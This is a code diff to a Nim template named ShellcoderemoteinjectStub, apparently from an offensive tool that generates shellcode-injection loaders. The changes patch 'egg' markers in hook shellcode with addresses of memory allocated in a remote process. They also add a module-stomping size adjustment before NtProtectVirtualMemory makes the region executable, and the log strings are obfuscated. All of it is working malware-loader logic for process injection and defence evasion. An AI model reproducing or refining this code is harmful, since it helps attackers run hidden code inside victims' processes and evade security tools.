@@ -694,15 +694,14 @@ let ShellcoderemoteinjectStub * = """
                         when defined(verbose):
                             echo obf("[*] Found egg at index: "), i
                         eggIndex = i
+                        when defined(verbose):
+                            echo obf("[*] Writing allocated memory address into egg")
+
+                        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
+
+                        when defined(verbose):
+                            echo obf("[*] Done.")
                         break
-
-                when defined(verbose):
-                    echo obf("[*] Writing allocated memory address into egg")
-
-                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
-
-                when defined(verbose):
-                    echo obf("[*] Done.")
 
                 # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
 
@@ -719,12 +718,12 @@ let ShellcoderemoteinjectStub * = """
                             echo obf("[*] Found egg at index: "), i
                         # our 0x00 bytes start at position three, so we need to add three to the index
                         eggIndex = i + 2
+
+                        when defined(verbose):
+                            echo obf("[*] Writing memory address into the jump at the end")
+
+                        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
                         break
-
-                when defined(verbose):
-                    echo obf("[*] Writing memory address into the jump at the end")
-
-                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
 
                 eggIndex = 0
 
@@ -734,12 +733,12 @@ let ShellcoderemoteinjectStub * = """
                             echo obf("[*] Found egg at index: "), i
                         # our 0x00 bytes start at position three, so we need to add three to the index
                         eggIndex = i + 2
+                    
+                        when defined(verbose):
+                            echo obf("[*] Writing memory address into the jump at the end")
+
+                        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
                         break
-
-                when defined(verbose):
-                    echo obf("[*] Writing memory address into the jump at the end")
-
-                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
 
 
                 # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)
@@ -757,11 +756,11 @@ let ShellcoderemoteinjectStub * = """
                             when defined(verbose):
                                 echo obf("[*] Found egg at index: "), i
                             eggIndex = i
-                            break
 
-                    when defined(verbose):
-                        echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
-                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)
+                            when defined(verbose):
+                                echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
+                            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)
+                            break
 
 
 
@@ -804,6 +803,8 @@ let ShellcoderemoteinjectStub * = """
 
                 #var oldProtect: DWORD
                 protectAddress = rPtr2
+                when defined(stomb):
+                    hook_sc_size = hook_sc_size + 0x1000
                 status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
                 
                 when defined(logFile):
